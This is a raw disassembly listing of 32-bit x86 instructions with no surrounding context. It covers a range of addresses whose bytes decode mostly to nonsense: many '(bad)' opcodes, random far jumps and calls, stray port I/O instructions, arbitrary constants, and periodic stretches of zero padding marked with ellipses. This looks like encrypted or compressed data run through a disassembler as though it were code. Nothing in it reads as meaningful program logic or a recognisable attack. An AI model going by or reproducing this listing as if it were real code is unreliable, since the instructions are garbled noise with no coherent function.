  41fac5:	rol    BYTE PTR [ecx+0x41],1
  41fac8:	mov    ah,0x2a
  41faca:	bswap  eax
  41facc:	jle    0x41fa81
  41face:	scas   eax,DWORD PTR es:[edi]
  41facf:	stos   BYTE PTR es:[edi],al
  41fad0:	jecxz  0x41fb39
  41fad2:	fstp   DWORD PTR [edx]
  41fad4:	mov    ecx,0xc3675ede
  41fad9:	ret    
  41fada:	imul   esi
  41fadc:	sbb    eax,0xbf8703b3
  41fae1:	mov    ecx,0x6e6344e1
  41fae6:	loope  0x41fb3a
  41fae8:	xor    BYTE PTR [edi+0x74768142],cl
  41faee:	test   ecx,ebx
  41faf0:	mov    dl,0x37
  41faf2:	pop    edi
  41faf3:	sbb    DWORD PTR [ebx],esi
  41faf5:	js     0x41fb17
  41faf7:	cmp    DWORD PTR [edi+eiz*2],esp
  41fafa:	and    eax,0x136d877a
  41faff:	mov    ecx,0x3578717d
  41fb04:	sbb    DWORD PTR [eax+0x10],ecx
  41fb07:	sub    al,0x36
  41fb09:	dec    edi
  41fb0a:	mov    dl,0xdc
  41fb0c:	cmc    
  41fb0d:	std    
  41fb0e:	mov    WORD PTR ds:0xa5539da1,?
  41fb14:	mov    ch,0x86
  41fb16:	jae    0x41fb46
  41fb18:	(bad)  
  41fb1b:	fwait
  41fb1c:	add    BYTE PTR [ebx+0x224f1f77],ah
  41fb22:	mov    ch,0x11
  41fb24:	(bad)  [ebp-0x4869616d]
  41fb2a:	adc    DWORD PTR [edx+esi*2+0x62],ebx
  41fb2e:	inc    esi
  41fb2f:	mov    al,0x95
  41fb31:	mov    cs,WORD PTR [ebx]
  41fb33:	xrelease mov BYTE PTR [ebx+ebx*4-0x67],bl
  41fb38:	lock mov bh,0x16
  41fb3b:	aaa    
  41fb3c:	cmp    esp,DWORD PTR [eax-0x763f1446]
  41fb42:	push   ds
  41fb43:	repnz frstor [ebx-0x70]
  41fb47:	xchg   edx,eax
  41fb48:	cmp    al,0x47
  41fb4a:	scas   eax,DWORD PTR es:[edi]
  41fb4b:	dec    esi
  41fb4c:	cmp    eax,ebx
  41fb4e:	jl     0x41fadd
  41fb50:	dec    edi
  41fb51:	pop    ecx
  41fb52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb53:	lock xchg DWORD PTR [ecx+0x1c],ecx
  41fb57:	out    dx,eax
  41fb58:	mov    al,0x72
  41fb5a:	mov    esp,0xa11c33c0
  41fb5f:	fistp  QWORD PTR [edx+0x60]
  41fb62:	fmul   QWORD PTR [eax+0xa89807c]
  41fb68:	jo     0x41faf2
  41fb6a:	mov    ecx,0xd14d5fb0
  41fb6f:	sbb    BYTE PTR [eax+eiz*4],ah
  41fb72:	stos   BYTE PTR es:[edi],al
  41fb73:	push   cs
  41fb74:	xchg   edx,eax
  41fb75:	aas    
  41fb76:	not    DWORD PTR [eax-0x46de061d]
  41fb7c:	sbb    bl,BYTE PTR [ecx+0x5c]
  41fb7f:	inc    bp
  41fb81:	ss mov ss,ebx
  41fb84:	inc    ebx
  41fb85:	mov    bh,0xc9
  41fb87:	out    dx,al
  41fb88:	jns    0x41fc06
  41fb8a:	dec    ebp
  41fb8b:	dec    eax
  41fb8c:	push   esi
  41fb8d:	cld    
  41fb8e:	fcomp  DWORD PTR [eax]
  41fb90:	mov    ecx,0x0
	...
  41fbf1:	add    BYTE PTR [eax],al
  41fbf3:	add    ah,bl
  41fbf5:	sub    BYTE PTR [edx-0x119011c],cl
  41fbfb:	cmp    BYTE PTR [esi],ah
  41fbfd:	ret    
  41fbfe:	or     DWORD PTR [esi],edx
  41fc00:	cmp    al,0xb0
  41fc02:	inc    eax
  41fc03:	mov    eax,ds:0x15252
  41fc08:	add    eax,0x7e000001
  41fc0d:	repz (bad) 
  41fc0f:	cmc    
  41fc10:	test   eax,0x3a43c291
  41fc15:	mov    ch,0x11
  41fc17:	pop    esp
  41fc18:	sahf   
  41fc19:	sub    eax,0x5eb45b7
  41fc1e:	mov    fs,WORD PTR [ebp+0x3a]
  41fc21:	sbb    dl,BYTE PTR [edi+ebp*8]
  41fc24:	push   es
  41fc25:	cli    
  41fc26:	mov    dh,0x2f
  41fc28:	xor    DWORD PTR [eax+0x26b8421b],ebp
  41fc2e:	sub    ebp,esp
  41fc30:	jmp    0x8e8cd7d5
  41fc35:	mov    cl,0x32
  41fc37:	fbld   TBYTE PTR [ebp+0x10b203df]
  41fc3d:	(bad)  
  41fc3e:	jae    0x41fcaf
  41fc40:	inc    ecx
  41fc41:	into   
  41fc42:	xor    ch,BYTE PTR [ebx+edi*4+0x45]
  41fc46:	loopne 0x41fc74
  41fc48:	push   esp
  41fc49:	(bad)  
  41fc4a:	into   
  41fc4b:	push   cs
  41fc4c:	cs dec edi
  41fc4e:	shl    DWORD PTR [esi],cl
  41fc50:	or     BYTE PTR [eax-0x6a],ah
  41fc53:	and    BYTE PTR [eax],cl
  41fc55:	ss mov ebp,0xd9b40ed3
  41fc5b:	test   eax,0xf37848a7
  41fc60:	pushf  
  41fc61:	(bad)  
  41fc62:	fisub  WORD PTR [ecx]
  41fc64:	aam    0xde
  41fc66:	mov    esp,0xbc186495
  41fc6b:	repnz and bl,BYTE PTR [ebx+0x2218aeb2]
  41fc72:	(bad)  
  41fc73:	(bad)  
  41fc74:	jns    0x41fc65
  41fc76:	test   DWORD PTR [eax],esi
  41fc78:	pop    edi
  41fc79:	repz fsubr DWORD PTR [ecx+edi*2]
  41fc7d:	xor    cl,BYTE PTR [eax+0x2cb47111]
  41fc83:	retf   0x874f
  41fc86:	je     0x41fc5e
  41fc88:	sbb    al,0xe
  41fc8a:	push   eax
  41fc8b:	push   ecx
  41fc8c:	sub    al,0xf5
  41fc8e:	xor    DWORD PTR [eax-0x4c82bb56],edi
  41fc94:	jmp    0x41fd11
  41fc96:	mov    bl,0xef
  41fc98:	xor    al,0x1d
  41fc9a:	and    ebp,DWORD PTR [ebp-0xa]
  41fc9d:	(bad)  [ecx-0x6c23f022]
  41fca3:	xor    eax,DWORD PTR [ecx+0x57]
  41fca6:	(bad)  
  41fca7:	loopne 0x41fc6b
  41fca9:	inc    ebx
  41fcaa:	mov    eax,0x3ac417b3
  41fcaf:	pop    es
  41fcb0:	in     al,0xb0
  41fcb2:	add    bh,bl
  41fcb4:	cmp    esi,DWORD PTR [esi+0x6f98be9]
  41fcba:	ror    dl,cl
  41fcbc:	add    eax,0x7050d392
  41fcc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcc2:	into   
  41fcc3:	(bad)  
  41fcc5:	fcom   QWORD PTR ds:0x1e66ffd8
  41fccc:	loopne 0x41fce1
  41fcce:	(bad)  
  41fccf:	mov    ds:0xfce5bf1c,al
  41fcd4:	out    dx,eax
  41fcd5:	dec    esp
  41fcd6:	xor    ecx,eax
  41fcd8:	cmp    al,0x67
  41fcda:	and    al,0xe9
  41fcdc:	jno    0x41fcb3
  41fcde:	loop   0x41fd38
  41fce0:	jb     0x41fcc4
  41fce2:	xchg   esi,eax
  41fce3:	fs push edi
  41fce5:	jae    0x41fd5b
  41fce7:	push   edi
  41fce8:	sbb    esi,edx
  41fcea:	push   esi
  41fceb:	or     al,0xb4
  41fced:	sub    edi,DWORD PTR ds:0x3c5080d7
  41fcf3:	sbb    DWORD PTR [ebx+0x3f83bf48],0x3fdf3ef8
  41fcfd:	fistp  DWORD PTR [edi]
  41fcff:	dec    esp
  41fd00:	mov    edi,0x7d8f9234
  41fd05:	xor    al,0x87
  41fd07:	dec    esi
  41fd08:	pop    ebp
  41fd09:	test   eax,0xd695e655
  41fd0e:	sub    BYTE PTR ds:0x8a,0x0
	...
  41fd71:	add    BYTE PTR [eax],al
  41fd73:	add    BYTE PTR [edx+ebp*2],cl
  41fd76:	push   edx
  41fd77:	shl    DWORD PTR [esi-0x7],0x9f
  41fd7b:	out    dx,eax
  41fd7c:	pop    ds
  41fd7d:	pop    edx
  41fd7e:	pushf  
  41fd7f:	push   ss
  41fd80:	sti    
  41fd81:	xor    BYTE PTR [ebx+eax*2+0x15357],bh
  41fd88:	add    eax,0x9d000001
  41fd8d:	mov    ch,0x44
  41fd8f:	add    edi,esp
  41fd91:	daa    
  41fd92:	xchg   ecx,eax
  41fd93:	std    
  41fd94:	call   0x29de:0xf1d8132b
  41fd9b:	sahf   
  41fd9c:	push   cs
  41fd9d:	fnstsw ax
  41fd9f:	cs pop ds
  41fda1:	outs   dx,DWORD PTR ds:[esi]
  41fda2:	sbb    edi,DWORD PTR [ebx]
  41fda4:	pop    ecx
  41fda5:	(bad)  
  41fda6:	or     al,0x89
  41fda8:	sbb    BYTE PTR [esi+eax*8-0x2e],bh
  41fdac:	scas   al,BYTE PTR es:[edi]
  41fdad:	fnstsw WORD PTR [ecx+0x7d]
  41fdb0:	popa   
  41fdb1:	in     al,0xf9
  41fdb3:	cs jne 0x41fd77
  41fdb6:	sub    cl,al
  41fdb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdb9:	jle    0x41fe25
  41fdbb:	mov    esi,edi
  41fdbd:	jmp    0xf315fc5c
  41fdc2:	lods   al,BYTE PTR ds:[esi]
  41fdc3:	cmp    BYTE PTR [ecx-0x76586526],dh
  41fdc9:	mov    BYTE PTR [ecx+eiz*8-0x41],cl
  41fdcd:	xchg   esp,eax
  41fdce:	ja     0x41fdf6
  41fdd0:	mov    al,ds:0xc0bbe37e
  41fdd5:	aam    0x1f
  41fdd7:	dec    ebp
  41fdd8:	cld    
  41fdd9:	fld    QWORD PTR [ecx]
  41fddb:	gs scas al,BYTE PTR es:[edi]
  41fddd:	jne    0x41fd76
  41fddf:	mov    edx,0x3d4159d1
  41fde4:	push   esp
  41fde5:	rol    DWORD PTR [eax+eax*4],1
  41fde8:	push   es
  41fde9:	je     0x41fdc8
  41fdeb:	cwde   
  41fdec:	aas    
  41fded:	and    ch,0xa8
  41fdf0:	(bad)  
  41fdf1:	daa    
  41fdf2:	out    dx,al
  41fdf3:	(bad)  
  41fdf4:	xlat   BYTE PTR ds:[ebx]
  41fdf5:	xor    al,0xad
  41fdf7:	dec    ebx
  41fdf8:	cs jge 0x41fdb3
  41fdfb:	arpl   WORD PTR [edx-0x1e],bp
  41fdfe:	mov    eax,ds:0x7a354489
  41fe03:	les    ebp,FWORD PTR [edi-0x5dd798c]
  41fe09:	(bad)  
  41fe0a:	loope  0x41fdb0
  41fe0c:	mov    bh,0x6d
  41fe0e:	out    dx,al
  41fe0f:	pushf  
  41fe10:	fcomp  QWORD PTR [ecx-0x67]
  41fe13:	int    0x66
  41fe15:	sub    cl,BYTE PTR [edi]
  41fe17:	scas   eax,DWORD PTR es:[edi]
  41fe18:	pop    eax
  41fe19:	pop    edx
  41fe1a:	mov    ah,BYTE PTR [ecx]
  41fe1c:	es jo  0x41fe70
  41fe1f:	popa   
  41fe20:	xchg   esi,eax
  41fe21:	xlat   BYTE PTR ds:[ebx]
  41fe22:	add    esp,DWORD PTR [ecx+0x16c6907f]
  41fe28:	rcl    ebx,1
  41fe2a:	jns    0x41fe10
  41fe2c:	test   esp,edx
  41fe2e:	retf   
  41fe2f:	leave  
  41fe30:	cs add eax,0x7a88162e
  41fe36:	inc    ebx
  41fe37:	ins    BYTE PTR es:[edi],dx
  41fe38:	cs push 0x3b288d15
  41fe3e:	add    ah,bh
  41fe40:	rcl    BYTE PTR [ebx],0x9d
  41fe43:	popa   
  41fe44:	dec    esi
  41fe45:	imul   ebp,DWORD PTR [esi-0x16b746d8],0x49
  41fe4c:	out    dx,eax
  41fe4d:	and    BYTE PTR [edi-0x19],bh
  41fe50:	jmp    0x18b8:0x40712017
  41fe57:	jns    0x41fe32
  41fe59:	push   edi
  41fe5a:	mov    al,0xe9
  41fe5c:	mov    ebx,0x28e7165d
  41fe61:	inc    esi
  41fe62:	inc    edx
  41fe63:	(bad)  
  41fe65:	pusha  
  41fe66:	imul   edi,ebp,0xffffffe3
  41fe69:	push   ebx
  41fe6a:	(bad)  
  41fe6b:	bnd jo 0x41fe3c
  41fe6e:	mov    DWORD PTR [ebp+0x54],ebp
  41fe71:	xor    eax,0xa76d4c95
  41fe76:	sbb    DWORD PTR [esp+eax*2-0x668d554c],esp
  41fe7d:	and    eax,0xb4ab3541
  41fe82:	sbb    eax,0xf4c16de8
  41fe87:	out    dx,al
  41fe88:	shl    BYTE PTR [edx+0x6b23dc5c],1
  41fe8e:	xor    bh,cl
  41fe90:	adc    eax,DWORD PTR [eax]
	...
  41fef2:	add    BYTE PTR [eax],al
  41fef4:	stos   BYTE PTR es:[edi],al
  41fef5:	push   ebp
  41fef6:	call   0xfb5d:0xffefffe7
  41fefd:	(bad)  
  41fefe:	hlt    
  41feff:	mov    ah,0x26
  41ff01:	and    BYTE PTR [ecx+0x1545c77],ah
  41ff07:	add    BYTE PTR ds:0xfa000001,al
  41ff0d:	sbb    ebp,0xfffffff9
  41ff10:	out    dx,al
  41ff11:	ret    
  41ff12:	push   ds
  41ff13:	ss out 0xc4,eax
  41ff16:	das    
  41ff17:	mov    edx,ebp
  41ff19:	test   al,0x5e
  41ff1b:	shl    BYTE PTR [esi],0x4f
  41ff1e:	das    
  41ff1f:	mov    DWORD PTR [eax],ebx
  41ff21:	dec    ecx
  41ff22:	sbb    eax,0x91cc726d
  41ff27:	arpl   WORD PTR [edx],dx
  41ff29:	adc    ebx,DWORD PTR [esp+eax*2+0x57]
  41ff2d:	inc    edi
  41ff2e:	cld    
  41ff2f:	out    0xe5,al
  41ff31:	add    eax,0xa68a9d1b
  41ff36:	jmp    0x1018:0xde47b059
  41ff3d:	repz bound ecx,QWORD PTR [ecx-0x3fc17f33]
  41ff44:	jge    0x41fee2
  41ff46:	je     0x41ff95
  41ff48:	or     esp,0x54916c26
  41ff4e:	add    edi,0x37e6a67c
  41ff54:	or     BYTE PTR [ecx-0x4a4fc485],0xb0
  41ff5b:	xchg   edi,eax
  41ff5c:	and    eax,edi
  41ff5e:	lds    ebx,FWORD PTR [ebp-0x89ad826]
  41ff64:	xchg   ebx,eax
  41ff65:	retf   
  41ff66:	mov    BYTE PTR [edi+0xc92dfc2],dl
  41ff6c:	nop
  41ff6d:	loopne 0x41ffd5
  41ff6f:	pusha  
  41ff70:	shl    BYTE PTR ds:0x9948e7d,0xe6
  41ff77:	push   0xffffffb9
  41ff79:	add    BYTE PTR [esi],ch
  41ff7b:	ja     0x41ff0f
  41ff7d:	and    esi,DWORD PTR [ebx+0x5c995acf]
  41ff83:	mov    bh,0x15
  41ff85:	pusha  
  41ff86:	imul   edi,eax,0xc8c516ef
  41ff8c:	ins    BYTE PTR es:[edi],dx
  41ff8d:	sub    ecx,DWORD PTR [esi+0x6e5e9c59]
  41ff93:	mov    dh,0x5c
  41ff95:	loopne 0x41ffe5
  41ff97:	int    0x61
  41ff99:	mov    dh,0x3
  41ff9b:	adc    eax,0x3955865
  41ffa0:	sbb    esp,edx
  41ffa2:	inc    esp
  41ffa3:	cdq    
  41ffa4:	enter  0x97cd,0x32
  41ffa8:	jp     0x41ff7d
  41ffaa:	lds    ecx,FWORD PTR [edx]
  41ffac:	sub    dl,BYTE PTR [edx]
  41ffae:	loopne 0x41ff32
  41ffb0:	lock or DWORD PTR [edx],ebp
  41ffb3:	push   edx
  41ffb4:	ins    BYTE PTR es:[edi],dx
  41ffb5:	mov    esi,0xa43aefd8
  41ffba:	pop    edx
  41ffbb:	loopne 0x42000a
  41ffbd:	xchg   ebx,eax
  41ffbe:	loopne 0x41ffc5
  41ffc0:	inc    ebp
  41ffc1:	rcl    BYTE PTR [ecx-0x6364f1e2],1
  41ffc7:	xor    al,0xeb
  41ffc9:	ja     0x41fff6
  41ffcb:	shr    DWORD PTR [edx],cl
  41ffcd:	aad    0x43
  41ffcf:	sub    ch,cl
  41ffd1:	mov    esp,0x7a87baf2
  41ffd6:	xor    dl,cl
  41ffd8:	inc    esp
  41ffd9:	dec    edi
  41ffda:	test   DWORD PTR ds:0x7d232839,ecx
  41ffe0:	fnstsw WORD PTR [esp+eiz*8+0x47b1f6bb]
  41ffe7:	jecxz  0x41ff6d
  41ffe9:	mov    ds:0xcddb2f0b,al
  41ffee:	les    edi,FWORD PTR [ebx+0x64]
  41fff1:	btr    DWORD PTR [ecx+0x4b],ebx
  41fff5:	add    BYTE PTR [ebx-0x48f64def],al
  41fffb:	fisub  WORD PTR [esi]
  41fffd:	cld    
  41fffe:	pop    ss
  41ffff:	xchg   ebx,eax
  420000:	push   es
  420001:	lods   al,BYTE PTR ds:[esi]
  420002:	clc    
  420003:	xchg   esp,eax
  420004:	mov    dl,0xf5
  420006:	(bad)  
  420007:	push   ss
  420008:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420009:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42000a:	scas   eax,DWORD PTR es:[edi]
  42000b:	dec    esp
  42000c:	mov    ebp,0xc7331b18
	...
  420071:	add    BYTE PTR [eax],al
  420073:	add    BYTE PTR [edx-0x5b],ah
  420076:	jbe    0x4200f7
  420078:	idiv   edi
  42007a:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0xffffff8c
  420081:	rcr    BYTE PTR [ecx],cl
  420083:	(bad)  
  420084:	popa   
  420085:	push   ebp
  420086:	add    DWORD PTR [eax],eax
  420088:	add    eax,0x58000001
  42008d:	mov    eax,0xe2f5e83e
  420092:	mov    edx,0x516acfd5
  420097:	sub    dh,ah
  420099:	pushf  
  42009a:	mov    esp,0x3845122
  42009f:	mov    ch,0xcb
  4200a1:	mov    edx,0x512f303c
  4200a6:	sub    al,0x68
  4200a8:	sub    BYTE PTR [esi-0x14],dh
  4200ab:	mov    ecx,0xf5b35ad2
  4200b0:	mov    ebx,0x1297b825
  4200b5:	jg     0x4200a7
  4200b7:	xor    dh,al
  4200b9:	and    ecx,DWORD PTR ds:0x9378be06
  4200bf:	fild   DWORD PTR [esi-0x19bd47a]
  4200c5:	cld    
  4200c6:	inc    eax
  4200c7:	mov    ds:0x6e245c5b,al
  4200cc:	mov    cl,0x0
  4200ce:	iret   
  4200cf:	xor    eax,0x9a468707
  4200d4:	jg     0x420068
  4200d6:	ret    
  4200d7:	pushf  
  4200d8:	iret   
  4200d9:	add    dl,bh
  4200db:	addr16 popf 
  4200dd:	lods   eax,DWORD PTR ds:[esi]
  4200de:	retf   
  4200df:	inc    edi
  4200e0:	out    0xcf,eax
  4200e2:	xchg   ebx,eax
  4200e3:	jmp    0xc9184e85
  4200e8:	mov    bl,0x1d
  4200ea:	and    cl,dh
  4200ec:	mov    dl,0xc7
  4200ee:	iret   
  4200ef:	xchg   esp,eax
  4200f0:	out    dx,eax
  4200f1:	xor    eax,esi
  4200f3:	gs pop ecx
  4200f5:	jecxz  0x42007d
  4200f7:	inc    edx
  4200f8:	sbb    BYTE PTR [ecx-0x69d83246],cl
  4200fe:	dec    edi
  4200ff:	mov    ds:0xa6c6a38d,eax
  420104:	adc    eax,0x6f1b7f7e
  420109:	(bad)  
  42010a:	cdq    
  42010b:	retf   
  42010c:	pop    ebx
  42010d:	(bad)
  420111:	sahf   
  420112:	mov    BYTE PTR [ebx],0x28
  420115:	retf   0xdd1b
  420118:	and    al,0x63
  42011a:	jecxz  0x4200c3
  42011c:	sbb    cl,BYTE PTR [edi]
  42011e:	mov    ds:0x91847b3a,eax
  420123:	std    
  420124:	fwait
  420125:	add    ecx,ecx
  420127:	pop    esp
  420128:	stc    
  420129:	mov    ?,WORD PTR fs:[edx-0x64]
  42012d:	lds    edi,FWORD PTR [esi]
  42012f:	je     0x4200fb
  420131:	rcl    BYTE PTR [edi-0x12f5fa6],cl
  420137:	mov    DWORD PTR [edi+0x58c1d60f],edi
  42013d:	arpl   WORD PTR [esi+0x70],di
  420140:	sub    al,0xe5
  420142:	dec    eax
  420143:	call   0x5ab9:0xea7844f1
  42014a:	dec    edx
  42014b:	push   edi
  42014c:	fiadd  DWORD PTR [eax-0x3eef7204]
  420152:	out    0xd4,al
  420154:	(bad)  
  420155:	pop    DWORD PTR [ecx]
  420157:	mov    ds:0x7e65d7db,eax
  42015c:	dec    esi
  42015d:	outs   dx,BYTE PTR ds:[esi]
  42015e:	xor    eax,0xc5c4efe1
  420163:	leave  
  420164:	cmp    al,0x13
  420166:	push   esi
  420167:	rcr    BYTE PTR [eax],0x6a
  42016a:	hlt    
  42016b:	push   esp
  42016c:	sahf   
  42016d:	ds dec ecx
  42016f:	mov    edx,DWORD PTR [ebx]
  420171:	das    
  420172:	hlt    
  420173:	rcr    DWORD PTR [ebp+0x6610d7fd],1
  420179:	aad    0xac
  42017b:	push   eax
  42017c:	or     al,0x5a
  42017e:	(bad)  
  42017f:	jmp    0x420160
  420181:	sub    bh,BYTE PTR [ebx+0x38]
  420184:	xchg   ebp,eax
  420185:	mov    al,ds:0x7638ab83
  42018a:	loop   0x420178
  42018c:	out    0xb8,eax
  42018e:	ja     0x4201a5
  420190:	xchg   edi,eax
	...
  4201f1:	add    BYTE PTR [eax],al
  4201f3:	add    BYTE PTR [ebx-0x31],dh
  4201f6:	fwait
  4201f7:	cmp    DWORD PTR [edi-0x27300c83],edi
  4201fd:	stos   BYTE PTR es:[edi],al
  4201fe:	sar    BYTE PTR [ebx+0x37481c03],1
  420204:	push   si
  420206:	add    DWORD PTR [eax],eax
  420208:	add    eax,0x2c000001
  42020d:	sbb    ebp,DWORD PTR [eax+0x490a3d14]
  420213:	inc    eax
  420214:	es pop ecx
  420216:	(bad)  
  420217:	xchg   ebp,eax
  420218:	inc    eax
  420219:	or     al,cl
  42021b:	fidiv  DWORD PTR [ecx+0x3ca6208c]
  420221:	jbe    0x420229
  420223:	out    0x4a,eax
  420225:	icebp  
  420226:	fwait
  420227:	jp     0x42025b
  420229:	cmp    ecx,DWORD PTR [edx+0x11]
  42022c:	lods   al,BYTE PTR ds:[esi]
  42022d:	push   esi
  42022e:	sti    
  42022f:	aad    0x67
  420231:	je     0x4201bf
  420233:	clc    
  420234:	and    dh,BYTE PTR [esi-0x13b34115]
  42023a:	sbb    ecx,DWORD PTR [ebx+0x7d2924d3]
  420240:	jae    0x42024d
  420242:	mov    ebp,0x8d48823c
  420247:	xor    ah,ah
  420249:	jge    0x4201f0
  42024b:	push   cs
  42024c:	push   ds
  42024d:	mov    bh,0x43
  42024f:	ja     0x420272
  420251:	xchg   ebx,eax
  420252:	imul   ecx,DWORD PTR [ebx+0x3ab0d9e6],0xe541bb32
  42025c:	retf   0x2194
  42025f:	inc    ebp
  420260:	mov    esi,0x107a2811
  420265:	push   edx
  420266:	(bad)  
  420267:	mov    ds:0x925d0a06,al
  42026c:	sub    ecx,DWORD PTR [eax-0x6e7137b1]
  420272:	retf   
  420273:	frstor [edx+0x10]
  420276:	lds    ebp,FWORD PTR [edi-0x46]
  420279:	les    ecx,FWORD PTR [edx+0x3a]
  42027c:	xchg   esp,eax
  42027d:	adc    ah,al
  42027f:	hlt    
  420280:	in     al,dx
  420281:	xchg   edx,eax
  420282:	adc    bh,BYTE PTR [esi+0x34]
  420285:	or     esi,DWORD PTR [ecx-0x4cc388bc]
  42028b:	aaa    
  42028c:	icebp  
  42028d:	loope  0x4202a2
  42028f:	(bad)  
  420290:	leave  
  420291:	jne    0x420302
  420293:	push   ebx
  420294:	xchg   edi,eax
  420295:	dec    ecx
  420296:	mov    ah,0xa6
  420298:	fwait
  420299:	inc    eax
  42029a:	stos   DWORD PTR es:[edi],eax
  42029b:	daa    
  42029c:	aas    
  42029d:	push   0xffffffcd
  42029f:	pop    edi
  4202a0:	stc    
  4202a1:	adc    esi,ebp
  4202a3:	mov    ebx,0x90edb5ab
  4202a8:	jmp    0xace9eb9e
  4202ad:	sti    
  4202ae:	jns    0x420326
  4202b0:	inc    esp
  4202b1:	imul   edx,DWORD PTR [eax],0xbb409d55
  4202b7:	inc    esi
  4202b8:	sbb    al,0xcd
  4202ba:	mov    BYTE PTR [edi-0x55a048a7],ah
  4202c0:	fdivr  DWORD PTR [eax-0x7bfc97ca]
  4202c6:	mov    ah,0x2c
  4202c8:	outs   dx,DWORD PTR ds:[esi]
  4202c9:	cdq    
  4202ca:	push   esp
  4202cb:	fwait
  4202cc:	push   ebx
  4202cd:	test   DWORD PTR [edx+0x61],eax
  4202d0:	repnz inc edi
  4202d2:	shl    DWORD PTR [eax+edx*2],0xd5
  4202d6:	inc    ecx
  4202d7:	and    BYTE PTR [ecx+ebp*1],dh
  4202da:	pushf  
  4202db:	jp     0x42035c
  4202dd:	or     eax,0x77581e9d
  4202e2:	inc    ebx
  4202e3:	adc    BYTE PTR [edi-0x38a7f300],dh
  4202e9:	dec    esp
  4202ea:	ds jns 0x42031b
  4202ed:	icebp  
  4202ee:	repnz or eax,0x73ce0f4e
  4202f4:	push   ds
  4202f5:	(bad)  
  4202f6:	jnp    0x42032d
  4202f8:	jo     0x42034f
  4202fa:	test   ebp,esi
  4202fc:	cmp    edi,DWORD PTR [edi-0x80]
  4202ff:	retf   0x9829
  420302:	shl    BYTE PTR [edx*1-0x11276e8d],0x38
  42030a:	push   ds
  42030b:	sbb    eax,0x1ac9b100
  420310:	pop    ebx
	...
  420371:	add    BYTE PTR [eax],al
  420373:	add    BYTE PTR [ecx+0x6],al
  420376:	clc    
  420377:	mov    esi,0xff47feff
  42037c:	and    BYTE PTR [eax+0x2a],bh
  42037f:	hlt    
  420380:	pop    esi
  420381:	or     al,0xf8
  420383:	sub    DWORD PTR [ebx+0x57],0x1050001
  42038a:	add    BYTE PTR [eax],al
  42038c:	sub    al,0xac
  42038e:	adc    dh,BYTE PTR [edi-0x52]
  420391:	pmullw mm4,mm7
  420394:	xor    bl,BYTE PTR [edi+0x104069f8]
  42039a:	dec    edi
  42039b:	test   al,0xbc
  42039d:	pop    esi
  42039e:	xchg   ecx,eax
  42039f:	add    ah,BYTE PTR [ecx-0x6d10dadc]
  4203a5:	lahf   
  4203a6:	lahf   
  4203a7:	push   esp
  4203a8:	fwait
  4203a9:	call   0x4c01a3a5
  4203ae:	push   es
  4203af:	xor    eax,0xf5983033
  4203b4:	ror    DWORD PTR [ecx+0x3c],cl
  4203b7:	jmp    0xb6feced8
  4203bc:	add    DWORD PTR [ebx+0x3f],edi
  4203bf:	cmp    DWORD PTR [esi],esp
  4203c1:	push   ds
  4203c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203c3:	out    0xec,al
  4203c5:	fnstenv [edi]
  4203c7:	add    DWORD PTR [edx+0x2df27638],0xffffffe1
  4203ce:	mov    esi,0xa6624f0a
  4203d3:	push   eax
  4203d4:	lods   eax,DWORD PTR ds:[esi]
  4203d5:	xchg   BYTE PTR [ecx+0x56b1b982],ah
  4203db:	or     eax,0xd58ea4ff
  4203e0:	cmp    eax,0xe723d960
  4203e5:	pop    ds
  4203e6:	add    dl,BYTE PTR [ebp-0x4a]
  4203e9:	std    
  4203ea:	pop    ebp
  4203eb:	int3   
  4203ec:	and    eax,0x2598ff32
  4203f1:	add    dl,dl
  4203f3:	pop    ebp
  4203f4:	ficomp DWORD PTR [edx+0x72534d0b]
  4203fa:	aas    
  4203fb:	xor    BYTE PTR [eax+0x76],0x4c
  4203ff:	jg     0x420402
  420401:	mov    WORD PTR [ebp-0x75],es
  420404:	stos   BYTE PTR es:[edi],al
  420405:	lea    ebp,[edi+ecx*4]
  420408:	daa    
  420409:	ss jne 0x420465
  42040c:	mov    BYTE PTR [esi],al
  42040e:	xchg   BYTE PTR [edi],dh
  420410:	sar    DWORD PTR [esi],cl
  420412:	jae    0x420448
  420414:	xor    BYTE PTR [eax-0x3f8216b1],ch
  42041a:	mov    al,ds:0x143edcad
  42041f:	imul   edi,DWORD PTR [edi-0x18],0x533226c6
  420426:	ficom  DWORD PTR [ebp-0x61]
  420429:	adc    bh,BYTE PTR [edi+0x4588859e]
  42042f:	sbb    ecx,ebx
  420431:	xchg   edi,eax
  420432:	rol    BYTE PTR [eax+0x51090c59],cl
  420438:	loop   0x420410
  42043a:	push   ebp
  42043b:	ror    BYTE PTR [ecx+ecx*2],1
  42043e:	add    BYTE PTR [edi+0x11],ch
  420441:	mov    bl,BYTE PTR [esi-0x15631a1]
  420447:	mov    eax,0x351583ba
  42044c:	test   eax,0xebb0a309
  420451:	add    eax,DWORD PTR [ebx+0x34]
  420454:	enter  0x61f7,0x10
  420458:	les    edx,FWORD PTR [ebp+ecx*1-0x2b]
  42045c:	mov    ebp,0x55e4c35c
  420461:	inc    edx
  420462:	jge    0x420450
  420464:	or     eax,0xf0f1bbb5
  420469:	mov    bl,BYTE PTR [ecx+edi*2]
  42046c:	aam    0x5a
  42046e:	mov    dl,0x5f
  420470:	cmp    BYTE PTR [ebx-0x34],dl
  420473:	xchg   esp,eax
  420474:	std    
  420475:	ins    BYTE PTR es:[edi],dx
  420476:	test   al,0xda
  420478:	mov    dh,0x54
  42047a:	out    dx,eax
  42047b:	sub    bh,BYTE PTR [eax+0x6191e303]
  420481:	arpl   WORD PTR [ebp+0x6e],bx
  420484:	sub    ch,0x13
  420487:	dec    ebx
  420488:	fsubr  QWORD PTR [esi+edx*1-0x3b]
  42048c:	loop   0x4204b9
  42048e:	inc    esp
  42048f:	sub    al,BYTE PTR [ecx+0x0]
	...
  4204f2:	add    BYTE PTR [eax],al
  4204f4:	scas   al,BYTE PTR es:[edi]
  4204f5:	xchg   esp,eax
  4204f6:	push   edi
  4204f7:	adc    bh,BYTE PTR [edi-0x2d]
  4204fa:	out    dx,eax
  4204fb:	mov    esp,0x5a7f6c39
  420500:	xchg   edx,eax
  420501:	push   cs
  420502:	ins    DWORD PTR es:[edi],dx
  420503:	mov    edx,0x15870
  420508:	add    eax,0x9000001
  42050d:	repz xor DWORD PTR [edi-0x40],eax
  420511:	ss push edx
